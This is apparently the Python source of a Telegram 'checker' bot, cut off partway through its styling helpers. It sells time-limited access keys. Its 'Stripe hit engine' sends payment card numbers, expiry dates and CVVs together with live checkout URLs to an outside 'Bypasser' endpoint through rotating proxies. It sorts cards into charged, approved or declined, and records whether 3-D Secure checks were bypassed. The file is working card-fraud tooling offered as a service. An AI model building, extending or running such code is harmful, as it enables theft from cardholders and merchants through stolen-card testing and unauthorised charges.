"""
ShopI Checker — Telegram Bot  (single-file edition)
Admin ID : 8233015284
Token    : TELEGRAM_BOT_TOKEN env var

Includes: database layer (db.py), proxy checker (proxy_checker.py),
          Stripe hit engine (hit.py), and all bot commands (bot.py).
"""

from __future__ import annotations

# ═══════════════════════════════════════════════════════════════════════════════
#  STANDARD LIBRARY IMPORTS
# ═══════════════════════════════════════════════════════════════════════════════

import asyncio
import html
import json
import os
import random
import re
import sqlite3
import string
import sys
import time
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any
from urllib.parse import quote, unquote, urlencode, urlparse

# ═══════════════════════════════════════════════════════════════════════════════
#  THIRD-PARTY IMPORTS
# ═══════════════════════════════════════════════════════════════════════════════

import requests
import urllib3
from telegram import Bot as _Bot
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, ContextTypes

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ═══════════════════════════════════════════════════════════════════════════════
#  DATABASE LAYER  (formerly db.py)
# ═══════════════════════════════════════════════════════════════════════════════

DB_PATH = Path(__file__).resolve().parent / "bot.db"


def _conn() -> sqlite3.Connection:
    c = sqlite3.connect(str(DB_PATH))
    c.row_factory = sqlite3.Row
    return c


def init_db() -> None:
    with _conn() as c:
        c.executescript("""
            CREATE TABLE IF NOT EXISTS users (
                user_id     INTEGER PRIMARY KEY,
                username    TEXT    DEFAULT '',
                first_name  TEXT    DEFAULT '',
                authorized_by INTEGER,
                key_used    TEXT    DEFAULT '',
                expires_at  TEXT,
                checks_done INTEGER DEFAULT 0,
                charged     INTEGER DEFAULT 0,
                approved    INTEGER DEFAULT 0,
                declined    INTEGER DEFAULT 0,
                proxy       TEXT    DEFAULT '',
                created_at  TEXT    DEFAULT (datetime('now')),
                active      INTEGER DEFAULT 1
            );

            CREATE TABLE IF NOT EXISTS keys (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                key_value   TEXT    UNIQUE NOT NULL,
                days        INTEGER NOT NULL,
                created_by  INTEGER NOT NULL,
                created_at  TEXT    DEFAULT (datetime('now')),
                used_by     INTEGER,
                used_at     TEXT
            );
        """)


# ── Key helpers ──────────────────────────────────────────────────────────────

def _gen_key() -> str:
    chars = string.ascii_uppercase + string.digits
    return "-".join("".join(random.choices(chars, k=4)) for _ in range(4))


def create_key(days: int, created_by: int) -> str:
    key = _gen_key()
    with _conn() as c:
        c.execute(
            "INSERT INTO keys (key_value, days, created_by) VALUES (?, ?, ?)",
            (key, days, created_by),
        )
    return key


def get_key(key_value: str) -> sqlite3.Row | None:
    with _conn() as c:
        return c.execute(
            "SELECT * FROM keys WHERE key_value = ?", (key_value,)
        ).fetchone()


def use_key(key_value: str, user_id: int) -> dict[str, Any] | None:
    """Returns key row as dict if valid & unused, else None."""
    row = get_key(key_value)
    if not row or row["used_by"] is not None:
        return None
    with _conn() as c:
        c.execute(
            "UPDATE keys SET used_by=?, used_at=datetime('now') WHERE key_value=?",
            (user_id, key_value),
        )
    return dict(row)


def delete_key(key_value: str) -> bool:
    with _conn() as c:
        cur = c.execute(
            "DELETE FROM keys WHERE key_value=? AND used_by IS NULL", (key_value,)
        )
        return cur.rowcount > 0


def get_all_keys() -> list[sqlite3.Row]:
    with _conn() as c:
        return c.execute("SELECT * FROM keys ORDER BY created_at DESC").fetchall()


# ── User helpers ─────────────────────────────────────────────────────────────

def get_user(user_id: int) -> sqlite3.Row | None:
    with _conn() as c:
        return c.execute(
            "SELECT * FROM users WHERE user_id=?", (user_id,)
        ).fetchone()


def get_all_users() -> list[sqlite3.Row]:
    with _conn() as c:
        return c.execute(
            "SELECT * FROM users ORDER BY created_at DESC"
        ).fetchall()


def upsert_user(
    user_id: int,
    username: str,
    first_name: str,
    days: int,
    authorized_by: int,
    key_used: str = "",
) -> str:
    """Auth or re-auth a user. Returns the ISO expires_at string."""
    expires_at = (datetime.utcnow() + timedelta(days=days)).isoformat()
    with _conn() as c:
        c.execute(
            """
            INSERT INTO users
                (user_id, username, first_name, authorized_by, key_used, expires_at, active)
            VALUES (?,?,?,?,?,?,1)
            ON CONFLICT(user_id) DO UPDATE SET
                username=excluded.username,
                first_name=excluded.first_name,
                authorized_by=excluded.authorized_by,
                key_used=excluded.key_used,
                expires_at=excluded.expires_at,
                active=1
            """,
            (user_id, username, first_name, authorized_by, key_used, expires_at),
        )
    return expires_at


def deauth_user(user_id: int) -> None:
    with _conn() as c:
        c.execute("UPDATE users SET active=0 WHERE user_id=?", (user_id,))


def is_authorized(user_id: int) -> bool:
    row = get_user(user_id)
    if not row or not row["active"]:
        return False
    if row["expires_at"]:
        try:
            if datetime.fromisoformat(row["expires_at"]) < datetime.utcnow():
                return False
        except ValueError:
            return False
    return True


def update_stats(user_id: int, result_status: str) -> None:
    col = {"charged": "charged", "approved": "approved"}.get(result_status, "declined")
    with _conn() as c:
        c.execute(
            f"UPDATE users SET checks_done=checks_done+1, {col}={col}+1 WHERE user_id=?",
            (user_id,),
        )


def set_proxy(user_id: int, proxy: str) -> None:
    """Save proxy for any user, including admin who may not have a users row."""
    with _conn() as c:
        c.execute(
            """
            INSERT INTO users (user_id, proxy, active)
            VALUES (?, ?, 1)
            ON CONFLICT(user_id) DO UPDATE SET proxy=excluded.proxy
            """,
            (user_id, proxy),
        )


def get_proxy(user_id: int) -> str:
    """Return first proxy (or the only one) for backwards compat."""
    with _conn() as c:
        row = c.execute(
            "SELECT proxy FROM users WHERE user_id=?", (user_id,)
        ).fetchone()
    raw = (row["proxy"] or "") if row else ""
    return raw.split("\n")[0].strip() if raw else ""


def get_proxy_list(user_id: int) -> list[str]:
    """Return all saved proxies as a list."""
    with _conn() as c:
        row = c.execute(
            "SELECT proxy FROM users WHERE user_id=?", (user_id,)
        ).fetchone()
    raw = (row["proxy"] or "") if row else ""
    return [p.strip() for p in raw.split("\n") if p.strip()]


def add_days(user_id: int, days: int) -> bool:
    row = get_user(user_id)
    if not row:
        return False
    try:
        base = datetime.fromisoformat(row["expires_at"])
    except (TypeError, ValueError):
        base = datetime.utcnow()
    if base < datetime.utcnow():
        base = datetime.utcnow()
    new_exp = (base + timedelta(days=days)).isoformat()
    with _conn() as c:
        c.execute(
            "UPDATE users SET expires_at=?, active=1 WHERE user_id=?",
            (new_exp, user_id),
        )
    return True


# ═══════════════════════════════════════════════════════════════════════════════
#  PROXY CHECKER  (formerly proxy_checker.py)
# ═══════════════════════════════════════════════════════════════════════════════

CHECK_URL       = "http://ip-api.com/json"
DEFAULT_TIMEOUT = 10


def _parse_proxy(raw: str) -> dict[str, str] | None:
    """Parse any proxy format into {ip, port, username, password}."""
    raw = (raw or "").strip()
    if not raw:
        return None
    for prefix in ("http://", "https://", "socks5://", "socks4://"):
        if raw.lower().startswith(prefix):
            raw = raw[len(prefix):]
    if "@" in raw:
        auth, hostport = raw.rsplit("@", 1)
        user, pw = auth.split(":", 1) if ":" in auth else (auth, "")
        host, port = hostport.split(":", 1) if ":" in hostport else (hostport, "")
        return {"ip": host, "port": port, "username": user, "password": pw}
    parts = raw.split(":")
    if len(parts) >= 4:
        return {"ip": parts[0], "port": parts[1], "username": parts[2], "password": parts[3]}
    if len(parts) == 2:
        return {"ip": parts[0], "port": parts[1], "username": "", "password": ""}
    return None


def _to_requests_proxies(raw: str) -> dict | None:
    """Convert proxy string to a requests-compatible proxies dict."""
    p = _parse_proxy(raw)
    if not p or not p["ip"] or not p["port"]:
        return None
    if p["username"] and p["password"]:
        url = f"http://{p['username']}:{p['password']}@{p['ip']}:{p['port']}"
    else:
        url = f"http://{p['ip']}:{p['port']}"
    return {"http": url, "https": url}


def country_flag(code: str) -> str:
    """Convert ISO-2 country code to regional flag emoji."""
    if not code or len(code) != 2:
        return "🌍"
    try:
        return "".join(chr(ord(c.upper()) + 127397) for c in code)
    except Exception:
        return "🌍"


def check_proxy(proxy_str: str, timeout: int = DEFAULT_TIMEOUT) -> dict[str, Any]:
    result: dict[str, Any] = {
        "proxy": proxy_str, "alive": False, "ms": None,
        "ip": None, "country": None, "country_code": None,
        "city": None, "isp": None, "error": None,
    }
    proxies = _to_requests_proxies(proxy_str)
    if not proxies:
        result["error"] = "Invalid format"
        return result
    try:
        t0 = time.time()
        resp = requests.get(
            CHECK_URL, proxies=proxies, timeout=timeout,
            verify=False, headers={"User-Agent": "Mozilla/5.0"},
        )
        ms = int((time.time() - t0) * 1000)
        if resp.status_code == 200:
            data = resp.json()
            if data.get("status") == "success":
                result.update(
                    alive=True, ms=ms,
                    ip=data.get("query"), country=data.get("country"),
                    country_code=data.get("countryCode"),
                    city=data.get("city"), isp=data.get("isp"),
                )
            else:
                result["error"] = data.get("message", "API error")
        else:
            result["error"] = f"HTTP {resp.status_code}"
    except requests.exceptions.ProxyError:
        result["error"] = "Connection refused"
    except requests.exceptions.ConnectTimeout:
        result["error"] = "Timeout"
    except requests.exceptions.ReadTimeout:
        result["error"] = "Read timeout"
    except requests.exceptions.ConnectionError as e:
        msg = str(e)
        if "refused" in msg.lower():
            result["error"] = "Connection refused"
        elif "remote end closed" in msg.lower():
            result["error"] = "Connection closed"
        else:
            result["error"] = "Connection error"
    except Exception as e:
        result["error"] = str(e)[:80]
    return result


def check_proxies_bulk(proxy_list: list[str], timeout: int = DEFAULT_TIMEOUT) -> list[dict[str, Any]]:
    return [check_proxy(p, timeout) for p in proxy_list]


def ms_bar(ms: int | None) -> str:
    if ms is None:
        return ""
    if ms < 300:
        return "🟢"
    if ms < 700:
        return "🟡"
    return "🔴"


def ms_bar_premium(ms: int | None, e: dict) -> str:
    if ms is None:
        return ""
    if ms < 300:
        return e["OK"]
    if ms < 700:
        return e["WARN"]
    return e["X"]


def format_proxy_result(r: dict[str, Any], index: int | None = None) -> str:
    label = f"[{index}] " if index is not None else ""
    proxy = r["proxy"]
    p = _parse_proxy(proxy)
    if p and p.get("username") and p.get("password"):
        display = f"{p['ip']}:{p['port']}:****:****"
    else:
        display = proxy
    if r["alive"]:
        flag = country_flag(r.get("country_code") or "")
        country = r.get("country") or "Unknown"
        city = r.get("city") or ""
        ms = r["ms"]
        bar = ms_bar(ms)
        loc = f"{flag} {country}" + (f", {city}" if city else "")
        lines = [f"{label}{display}", f"  ✅ LIVE  {bar}  ⚡ {ms}ms", f"  📍 {loc}"]
        if r.get("ip"):
            lines.append(f"  🔗 Exit IP: {r['ip']}")
        if r.get("isp"):
            lines.append(f"  🏢 ISP: {r['isp']}")
    else:
        err = r.get("error") or "Unknown error"
        lines = [f"{label}{display}", f"  ❌ DEAD  •  {err}"]
    return "\n".join(lines)


def format_proxy_result_html(r: dict[str, Any], index: int | None, e: dict, html_esc) -> str:
    label = f"<b>[{index}]</b> " if index is not None else ""
    proxy = r["proxy"]
    p = _parse_proxy(proxy)
    if p and p.get("username") and p.get("password"):
        display = f"{p['ip']}:{p['port']}:****:****"
    else:
        display = proxy
    if r["alive"]:
        flag = country_flag(r.get("country_code") or "")
        country = r.get("country") or "Unknown"
        city = r.get("city") or ""
        ms = r["ms"]
        bar = ms_bar_premium(ms, e)
        loc = f"{flag} {country}" + (f", {city}" if city else "")
        lines = [
            f"{label}<code>{html_esc(display)}</code>",
            f"{e['OK']} <b>LIVE</b>  {bar}  {e['FIRE']} {ms}ms",
            f"{e['GLOB']} {loc}",
        ]
        if r.get("ip"):
            lines.append(f"{e['PIN']} Exit IP: <code>{html_esc(r['ip'])}</code>")
        if r.get("isp"):
            lines.append(f"{e['PHOR']} ISP: {html_esc(r['isp'])}")
    else:
        err = html_esc(r.get("error") or "Unknown error")
        lines = [f"{label}<code>{html_esc(display)}</code>", f"{e['X']} <b>DEAD</b>  •  {err}"]
    return "\n".join(lines)


def format_bulk_results(results: list[dict[str, Any]]) -> str:
    live  = [r for r in results if r["alive"]]
    dead  = [r for r in results if not r["alive"]]
    total = len(results)
    header = (
        "╔══════════════════════════════════╗\n"
        "║  🌐  P R O X Y  C H E C K E R   ║\n"
        "╚══════════════════════════════════╝\n\n"
        f"📊 Total: {total}  |  ✅ Live: {len(live)}  |  ❌ Dead: {len(dead)}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    )
    blocks = [format_proxy_result(r, index=i) for i, r in enumerate(results, 1)]
    body   = "\n\n".join(blocks)
    footer = "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    if live:
        avg_ms  = int(sum(r["ms"] for r in live) / len(live))
        fastest = min(live, key=lambda r: r["ms"])
        footer += f"\n⚡ Avg: {avg_ms}ms  |  🏆 Fastest: {fastest['ms']}ms"
    return header + body + footer


def format_bulk_results_html(results: list[dict[str, Any]], e: dict, html_esc) -> str:
    live  = [r for r in results if r["alive"]]
    dead  = [r for r in results if not r["alive"]]
    total = len(results)
    header = (
        f"{e['GLOB']} <b>P R O X Y  C H E C K E R</b>\n\n"
        f"{e['STAT']} Total: {total}  |  {e['OK']} Live: {len(live)}  |  {e['X']} Dead: {len(dead)}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    )
    blocks = [format_proxy_result_html(r, i, e, html_esc) for i, r in enumerate(results, 1)]
    body   = "\n\n".join(blocks)
    footer = "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    if live:
        avg_ms  = int(sum(r["ms"] for r in live) / len(live))
        fastest = min(live, key=lambda r: r["ms"])
        footer += f"\n{e['FIRE']} Avg: {avg_ms}ms  |  {e['CRWN']} Fastest: {fastest['ms']}ms"
    return header + body + footer


# ═══════════════════════════════════════════════════════════════════════════════
#  STRIPE HIT ENGINE  (formerly hit.py)
# ═══════════════════════════════════════════════════════════════════════════════

HIT_API_URL = "https://ravenxkiller.site/Bypasser/bot.php"

_SESSION_DEAD_PHRASES = (
    "no longer active", "has already been completed",
    "session has expired", "session expired", "session is expired",
    "checkout session has expired", "session voided", "status of canceled",
)


def parse_proxy_format(raw: str) -> dict[str, Any] | None:
    raw = (raw or "").strip()
    if not raw:
        return None
    for prefix in ("http://", "https://", "socks5://", "socks4://"):
        if raw.startswith(prefix):
            raw = raw[len(prefix):]
    if "@" in raw:
        auth, hostport = raw.rsplit("@", 1)
        user, pw = auth.split(":", 1) if ":" in auth else (auth, "")
        ip, port = hostport.split(":", 1) if ":" in hostport else (hostport, "")
        return {"ip": ip, "port": port, "username": user, "password": pw}
    parts = raw.split(":")
    if len(parts) >= 4:
        return {"ip": parts[0], "port": parts[1], "username": parts[2], "password": parts[3]}
    if len(parts) == 2:
        return {"ip": parts[0], "port": parts[1], "username": "", "password": ""}
    return None


def proxy_dict_to_url(proxy_data: dict[str, Any]) -> str | None:
    ip   = str(proxy_data.get("ip") or "").strip()
    port = str(proxy_data.get("port") or "").strip()
    user = str(proxy_data.get("username") or "").strip()
    pw   = str(proxy_data.get("password") or "").strip()
    if not ip or not port:
        return None
    if user and pw:
        return f"http://{user}:{pw}@{ip}:{port}"
    return f"http://{ip}:{port}"


def parse_co_card(card_str: str) -> dict[str, str] | None:
    parts = re.split(r"[|:]", card_str.strip())
    if len(parts) != 4:
        return None
    mm = f"{int(parts[1]):02d}"
    yy = parts[2].strip()
    if len(yy) <= 2:
        yy = "20" + yy.zfill(2)
    return {"cc": parts[0].strip(), "mm": mm, "yy": yy, "cvv": parts[3].strip()}


def card_to_api_string(card_str: str) -> str | None:
    card = parse_co_card(card_str)
    if not card:
        return None
    return f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"


def encode_checkout_for_api(checkout_url: str) -> str:
    url = (checkout_url or "").strip()
    if not url:
        return ""
    if "%23" in url and "#" not in url:
        url = unquote(url)
    return url


def _is_session_dead(msg: str) -> bool:
    low = (msg or "").lower()
    return any(p in low for p in _SESSION_DEAD_PHRASES)


def _proxy_to_api_string(proxy_data: dict[str, Any] | str | None) -> str | None:
    if not proxy_data:
        return None
    if isinstance(proxy_data, str):
        raw = proxy_data.strip()
        if not raw:
            return None
        if raw.startswith(("http://", "https://", "socks5://", "socks4://")):
            parsed = parse_proxy_format(raw)
            if parsed:
                proxy_data = parsed
            else:
                return raw
        else:
            return raw
    if not isinstance(proxy_data, dict):
        return None
    ip   = str(proxy_data.get("ip") or "").strip()
    port = str(proxy_data.get("port") or "").strip()
    user = str(proxy_data.get("username") or "").strip()
    pw   = str(proxy_data.get("password") or "").strip()
    if ip and port and user and pw:
        return f"{ip}:{port}:{user}:{pw}"
    if ip and port:
        return f"{ip}:{port}"
    return proxy_dict_to_url(proxy_data)


def _build_proxy_pool(
    proxy_data: dict[str, Any] | None = None,
    proxy_list: list | None = None,
) -> list[dict[str, Any]]:
    pool: list[dict[str, Any]] = []
    seen: set[str] = set()
    sources = list(proxy_list or [])
    if proxy_data and proxy_data not in sources:
        sources.insert(0, proxy_data)
    for item in sources:
        if isinstance(item, str):
            parsed = parse_proxy_format(item.strip())
            if parsed:
                item = parsed
        if not isinstance(item, dict):
            continue
        url = _proxy_to_api_string(item)
        if not url or url in seen:
            continue
        seen.add(url)
        pool.append(item)
    return pool


def bin_lookup(bin6: str) -> dict[str, Any]:
    fallback = {
        "brand": "UNKNOWN", "type": "UNKNOWN", "level": "STANDARD",
        "bank": "Unknown", "country": "Unknown", "country_code": "",
    }
    bin6 = (bin6 or "").strip()[:6]
    if len(bin6) < 6:
        return fallback
    try:
        r = requests.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=10, verify=False)
        d = r.json() if r.ok else {}
    except (requests.RequestException, json.JSONDecodeError, ValueError):
        d = {}
    if not isinstance(d, dict) or not d.get("brand"):
        return fallback
    ccode = str(d.get("country") or d.get("country_code") or "").upper()[:2]
    country_line = f"{(d.get('country_name') or 'Unknown').strip()} {(d.get('country_flag') or '')}".strip()
    if ccode:
        country_line += f"  (ISO {ccode})"
    return {
        "brand": d.get("brand") or "UNKNOWN",
        "type":  d.get("type")  or "UNKNOWN",
        "level": d.get("level") or "STANDARD",
        "bank":  d.get("bank")  or "Unknown",
        "country": country_line,
        "country_code": ccode,
    }


def _first_str(data: dict[str, Any], *keys: str) -> str:
    for key in keys:
        val = data.get(key)
        if val is not None and str(val).strip():
            return str(val).strip()
    return ""


def _parse_amount_cents(data: dict[str, Any]) -> int:
    price = _first_str(data, "price", "amount", "total")
    if price:
        m = re.search(r"([A-Za-z]{3})\s+([\d,]+(?:\.\d+)?)", price)
        if m:
            try:
                cents = int(round(float(m.group(2).replace(",", "")) * 100))
                if cents > 0:
                    return cents
            except (TypeError, ValueError):
                pass
        m = re.search(r"([\d,]+(?:\.\d+)?)\s*([A-Za-z]{3})", price)
        if m:
            try:
                cents = int(round(float(m.group(1).replace(",", "")) * 100))
                if cents > 0:
                    return cents
            except (TypeError, ValueError):
                pass
    for key in ("amount_cents", "amount", "total", "price"):
        val = data.get(key)
        if val is None:
            continue
        try:
            n = int(float(val))
            if n > 0:
                return n if n > 100 else n * 100
        except (TypeError, ValueError):
            continue
    return 0


def _normalize_hit_status(raw_status: str) -> str:
    s = (raw_status or "").lower().strip()
    if s in {"charge", "charged", "success", "succeeded", "paid"}:
        return "charged"
    if s in {"live", "approved", "approve"}:
        return "approved"
    return "declined"


def _session_dead_from_text(text: str) -> bool:
    low = (text or "").lower()
    return any(p in low for p in _SESSION_DEAD_PHRASES)


def _map_hit_response(body: dict[str, Any]) -> tuple[str, str, str]:
    api_status = _first_str(body, "status", "Status", "state").lower()
    message    = _first_str(body, "message", "msg", "detail", "reason", "error", "description")
    if not message:
        message = api_status or "Unknown"
    blob = f"{api_status} {message}".lower()

    if api_status == "error":
        return api_status, "declined", message

    if api_status in {"charge", "charged"} or any(
        x in blob for x in ("payment successful", "succeeded", " paid")
    ):
        return api_status or "charge", "charged", message or "Payment Successful"

    if api_status == "live" or any(
        k in blob for k in (
            "insufficient_funds", "insufficient funds",
            "incorrect_cvc", "invalid_cvc",
            "security code is incorrect", "invalid security code",
        )
    ):
        return api_status or "live", "approved", message

    if api_status in {"dead", "declined"}:
        return api_status or "dead", "declined", message or "Declined"

    if any(x in blob for x in ("declined", "failed", "reject", "denied")):
        return api_status or "dead", "declined", message or "Declined"

    if "proxyerror" in blob.replace(" ", "") or "unable to connect to proxy" in blob:
        return api_status or "dead", "declined", message or "Proxy Error"

    if "3ds" in blob or "challenge" in blob or "hcaptcha" in blob:
        return api_status or "dead", "declined", message or "Declined"

    normalized = _normalize_hit_status(api_status)
    return api_status or normalized, normalized, message or "Unknown"


def _build_hit_url(checkout_url: str, card_str: str, proxy: str | None = None) -> str:
    checkout = encode_checkout_for_api(checkout_url)
    base_qs  = urlencode({"cc": card_str, "proxy": proxy or ""}, quote_via=quote)
    return f"{HIT_API_URL}?{base_qs}&checkout={quote(checkout, safe='')}"


def _hit_checkout(
    checkout_url: str,
    card_str: str,
    proxy: str | None = None,
    email: str | None = None,
    *,
    timeout: int = 120,
) -> dict[str, Any]:
    api_card = card_to_api_string(card_str)
    if not api_card:
        return {"ok": False, "error": "Invalid card format (use cc|mm|yy|cvv)"}

    hit_url = _build_hit_url(checkout_url, api_card, proxy)
    try:
        r = requests.get(hit_url, timeout=timeout, verify=False)
    except requests.Timeout:
        return {"ok": False, "error": "hit.php timeout"}
    except requests.RequestException as exc:
        return {"ok": False, "error": f"hit.php error: {exc}"}

    raw_text = r.text or ""
    try:
        body = r.json() if raw_text else {}
    except json.JSONDecodeError:
        body = {"status": "error", "message": raw_text[:300]}

    if not isinstance(body, dict):
        body = {"status": "error", "message": str(body)[:300]}

    if r.status_code >= 500:
        return {
            "ok": False,
            "error": _first_str(body, "message", "error", "detail") or f"hit.php HTTP {r.status_code}",
        }

    api_status, result_status, result_msg = _map_hit_response(body)

    if api_status == "error":
        return {
            "ok": False,
            "error": result_msg,
            "session_dead": _session_dead_from_text(result_msg),
            "result_status": "declined",
            "result_msg": result_msg,
            "raw": body,
        }

    merchant      = _first_str(body, "merchant", "merchant_name", "store", "seller") or "Unknown"
    product       = _first_str(body, "product", "product_name", "item", "description") or "Unknown"
    price_display = _first_str(body, "price", "amount", "total") or "-"
    currency      = "USD"
    m = re.search(r"([A-Za-z]{3})\s+([\d.]+)", price_display)
    if m:
        currency = m.group(1).upper()
    else:
        m2 = re.search(r"([\d.]+)\s*([A-Za-z]{3})", price_display)
        if m2:
            currency = m2.group(2).upper()

    amount_cents = _parse_amount_cents(body)
    success_url  = _first_str(body, "success_url", "return_url", "redirect_url", "url")
    time_taken   = body.get("time_taken") or body.get("seconds")

    bin_info = body.get("bin")
    if not isinstance(bin_info, dict):
        bin_info = {}

    msg_lower  = result_msg.lower()
    hcaptcha   = "hcaptcha" in msg_lower or "captcha" in msg_lower
    if isinstance(body.get("3d_bypassed"), bool):
        tds_bypassed = bool(body["3d_bypassed"])
    else:
        tds_bypassed = (
            result_status == "charged"
            and not hcaptcha
            and "3ds not bypassed" not in msg_lower
            and "challenge" not in msg_lower
            and "otp" not in msg_lower
        )

    return {
        "ok": True,
        "merchant": merchant, "product": product,
        "currency": currency, "amount_cents": amount_cents,
        "price_display": price_display,
        "api_status": api_status, "result_status": result_status, "result_msg": result_msg,
        "success_url": success_url,
        "seconds":   float(time_taken) if time_taken is not None else None,
        "time_taken": float(time_taken) if time_taken is not None else None,
        "bin_info": bin_info, "hcaptcha": hcaptcha,
        "tds_bypassed": tds_bypassed, "3d_bypassed": tds_bypassed,
        "session_dead": _session_dead_from_text(result_msg),
        "raw": body,
    }


def run_hit_check(
    checkout_url: str,
    card_str: str,
    proxy_data: dict[str, Any] | str | None = None,
    max_proxy_retries: int = 3,
    nopecha_key: str = "",
    proxy_list: list | None = None,
) -> dict[str, Any]:
    card = parse_co_card(card_str)
    if not card:
        return {"ok": False, "error": "Invalid card format (use cc|mm|yy|cvv)"}

    if isinstance(proxy_data, str) and proxy_data.strip():
        proxy_data_dict = parse_proxy_format(proxy_data)
        proxy_pool = _build_proxy_pool(proxy_data_dict, proxy_list)
        if not proxy_pool:
            proxy_pool = [{"_raw": proxy_data}]
    else:
        proxy_pool = _build_proxy_pool(proxy_data, proxy_list)

    if not proxy_pool:
        return {"ok": False, "error": "No proxy set"}

    attempts = min(len(proxy_pool), max(1, int(max_proxy_retries or 1)))
    t0       = time.perf_counter()
    bin6     = card["cc"][:6] if len(card["cc"]) >= 6 else card["cc"]
    bin_row  = bin_lookup(bin6)

    last_err: str | None = None
    for attempt in range(attempts):
        item = proxy_pool[attempt % len(proxy_pool)]
        if isinstance(item, dict) and "_raw" in item:
            proxy_str = item["_raw"]
        else:
            proxy_str = _proxy_to_api_string(item)
        result = _hit_checkout(checkout_url, card_str, proxy=proxy_str)

        if not result.get("ok"):
            last_err = str(result.get("error") or "Checkout failed")
            if _is_session_dead(last_err):
                break
            continue

        elapsed = result.get("seconds")
        if elapsed is None:
            elapsed = round(time.perf_counter() - t0, 2)

        raw_bin = result.get("bin_info") or {}
        if isinstance(raw_bin, dict) and raw_bin.get("brand"):
            bin_row = {
                "brand":        raw_bin.get("brand")        or bin_row["brand"],
                "type":         raw_bin.get("type")         or bin_row["type"],
                "level":        raw_bin.get("level")        or bin_row["level"],
                "bank":         raw_bin.get("bank")         or bin_row["bank"],
                "country":      raw_bin.get("country")      or bin_row["country"],
                "country_code": raw_bin.get("country_code") or bin_row["country_code"],
            }

        return {
            "ok": True,
            "merchant":      result.get("merchant") or "Unknown",
            "product":       result.get("product")  or "Unknown",
            "currency":      result.get("currency") or "USD",
            "price_display": result.get("price_display") or "-",
            "amount_cents":  int(result.get("amount_cents") or 0),
            "result_status": result.get("result_status", "declined"),
            "result_msg":    result.get("result_msg", "Unknown"),
            "api_status":    result.get("api_status", ""),
            "seconds":       elapsed,
            "time_taken":    elapsed,
            "bin_info":      bin_row,
            "success_url":   result.get("success_url") or "",
            "3d_bypassed":   bool(result.get("3d_bypassed")),
            "tds_bypassed":  bool(result.get("tds_bypassed")),
            "hcaptcha":      bool(result.get("hcaptcha")),
            "session_dead":  bool(result.get("session_dead")),
            "raw":           result.get("raw") or {},
        }

    return {
        "ok": False,
        "error": last_err or "Checkout failed",
        "session_dead": _is_session_dead(last_err or ""),
    }


# ═══════════════════════════════════════════════════════════════════════════════
#  BOT CONFIG & GLOBALS
# ═══════════════════════════════════════════════════════════════════════════════

BOT_TOKEN        = os.environ["TELEGRAM_BOT_TOKEN"]
NOTIFY_BOT_TOKEN = os.environ.get("NOTIFY_BOT_TOKEN", "")
ADMIN_ID         = 8233015284
NOTIFY_CHAT_ID   = ADMIN_ID
GROUP_CHAT_ID    = -1003917642749
GROUP_CHAT_ID_2  = -1004347290990

init_db()

# ── Premium emojis ────────────────────────────────────────────────────────────

BAMBOO = '<tg-emoji emoji-id="5465271641355350028">🎍</tg-emoji>'
ZANGI  = '<tg-emoji emoji-id="5226717982230591144">👨‍💻</tg-emoji>'

def _e(eid: str, fallback: str) -> str:
    return f'<tg-emoji emoji-id="{eid}">{fallback}</tg-emoji>'

E_OK   = _e("5787428694322581130", "✅")
E_X    = _e("5789885209457463202", "❌")
E_CARD = _e("5801180866071760635", "💳")
E_WARN = _e("5800696552674561810", "⚠️")
E_WAIT = _e("5787432469598835099", "⏳")
E_SRCH = _e("5780522408385450404", "🔍")
E_STAT = _e("5787384838411522455", "📊")
E_CASH = _e("5787671690687286553", "💰")
E_DOLR = _e("5803273988318695040", "💵")
E_MNYS = _e("5787517290907962993", "💸")
E_CRWN = _e("5800664387664482264", "👑")
E_FIRE = _e("5805371392648023546", "🔥")
E_STAR = _e("5789410873269292841", "⭐")
E_DIAM = _e("5801031740512275821", "💎")
E_TRGT = _e("5780530293945405228", "🎯")
E_ALRM = _e("5787488119490088755", "⏰")
E_BELL = _e("5789387465697529488", "🔔")
E_ANON = _e("5789428375261023681", "📢")
E_SREN = _e("5805269760836899427", "🚨")
E_IDEA = _e("5778525162693463846", "💡")
E_NOTE = _e("5801171696316583596", "📝")
E_GIFT = _e("5852779353330421386", "🎁")
E_PACK = _e("5854908544712707500", "📦")
E_PRTY = _e("5789564388285354353", "🎉")
E_GLOB = _e("5780471598922337683", "🌍")
E_LIKE = _e("5805609368195961657", "👍")
E_BOOM = _e("5800856737774833096", "💥")
E_HETR = _e("5789477419492576770", "❤️")
E_MGIC = _e("5780758335233986403", "🔮")
E_PIN  = _e("5789626613771537810", "📌")
E_100  = _e("5800747065784929649", "💯")
E_BATL = _e("5787570720301126508", "🔋")
E_RNBW = _e("5789588083619926822", "🌈")
E_GOLD = _e("5787555142454743098", "🥇")
E_SPRK = _e("5800848182199979489", "✨")
E_PHOR = _e("5789697042645258272", "📞")
E_PRAY = _e("5803030158730333625", "🙏")
E_RBBN = _e("5780759366026137680", "🎀")
E_MOON = _e("5780462553721212633", "🌙")
E_SUN  = _e("5780878882081083109", "☀️")
E_BOMB = _e("5780545356395711921", "💣")
E_LOCK = _e("5789926376718995082", "🔓")
E_CART = _e("5854965264050818921", "🛒")
E_NEW  = _e("5854862833375776824", "🆕")


# ═══════════════════════════════════════════════════════════════════════════════
#  STYLING HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

def esc(t: str) -> str:
    return html.escape(str(t or ""))

def fb(text: str) -> str:
    """Convert ASCII letters/digits to Unicode Mathematical Sans-Serif Bold."""
    out = []
    for ch in str(text):
        if 'A' <= ch <= 'Z':
            out.append(chr(0x1D5D4 + ord(ch) - ord('A')))
        elif 'a' <= ch <= 'z':
            out.append(chr(0x1D5EE + ord(ch) - ord('a')))
        elif '0' <= ch <= '9':
            out.append(chr(0x1D7EC + ord(ch) - ord('0')))
        else:
            out.append(ch)
    return ''.join(out)

def fbe(text) -> str:
    return html.escape(fb(str(text or "")))

def days_left(expires_at: str | None) -> str:
    if not expires_at:
        return f"{E_100} Lifetime"
    try:
        delta = datetime.fromisoformat(expires_at) - datetime.utcnow()
